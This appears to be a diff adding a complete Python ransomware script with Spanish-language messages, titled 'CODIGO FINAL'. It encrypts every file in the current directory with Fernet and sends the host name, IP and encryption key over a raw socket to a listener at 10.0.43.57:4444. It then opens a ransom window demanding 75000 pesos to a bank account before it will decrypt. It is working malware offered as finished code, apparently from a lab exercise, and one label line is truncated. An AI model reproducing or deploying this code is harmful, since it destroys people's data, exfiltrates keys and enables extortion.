@@ -1,0 +1,92 @@
+CODIGO FINAL
+
+import os
+import socket
+from cryptography.fernet import Fernet
+import tkinter as tk
+from tkinter import messagebox
+
+def enviar_datos_remoto(key):
+    host = socket.gethostname()
+    try:
+        ip = socket.gethostbyname(host)
+    except:
+        ip = "IP no disponible"
+
+    mensaje = f"""
+[+] Nueva máquina comprometida
+Host: {host}
+IP: {ip}
+Llave: {key.decode()}
+"""
+
+    try:
+        # Conexión a la IP que escucha con nc
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.connect(("10.0.43.57", 4444))  # cambia IP si no esta en localhost
+            s.sendall(mensaje.encode())
+    except Exception as e:
+        print(f"Error al enviar datos: {e}")
+
+# --- encontrar archivos
+files = []
+for file in os.listdir():
+    if file in ["trigger.py", "llave.key", "gui_decrypt.py"]:
+        continue
+    if os.path.isfile(file):
+        files.append(file)
+
+# --- generar y guardar la llave
+key = Fernet.generate_key()
+
+# --- enviar datos remotos
+enviar_datos_remoto(key)
+
+# --- encriptar los archivos
+for file in files:
+    with open(file, "rb") as f:
+        contents = f.read()
+    encrypted = Fernet(key).encrypt(contents)
+    with open(file, "wb") as f:
+        f.write(encrypted)
+
+# --- ventana de desencriptacion
+def try_decrypt():
+    phrase = entry.get()
+    if phrase == key.decode():
+        for file in files:
+            with open(file, "rb") as f:
+                contents = f.read()
+            decrypted = Fernet(key).decrypt(contents)
+            with open(file, "wb") as f:
+                f.write(decrypted)
+        messagebox.showinfo("¡Hecho!", "Archivos desencriptados con éxito.")
+        window.destroy()
+    else:
+        messagebox.showerror("Error", "Frase incorrecta. Enviame 5000 pesos más...")
+
+window = tk.Tk()
+window.title("Tus archivos han sido secuestrados!")
+window.geometry("400x250")
+window.configure(bg="black")
+
+label = tk.Label(window, text="Tus archivos han sido encriptados.\nEnviame 75000 pesos a la cuenta 23456723 del Popular para recuperarlos\n Introduzca la llave correcta para liberar.>
+                 bg="black", fg="white", font=("Arial", 12), wraplength=360)
+label.pack(pady=20)
+
+entry = tk.Entry(window, show="*", font=("Arial", 14), width=25)
+entry.pack(pady=10)
+
+# pegar texto en intergaz
+def pegar(event=None):
+    entry.insert(tk.INSERT, window.clipboard_get())
+    return "break"
+
+entry.bind('<Control-v>', pegar)
+entry.bind('<Command-v>', pegar)
+
+btn = tk.Button(window, text="Desencriptar Archivos", command=try_decrypt,
+                bg="red", fg="white", font=("Arial", 12))
+btn.pack(pady=10)
+
+window.mainloop()
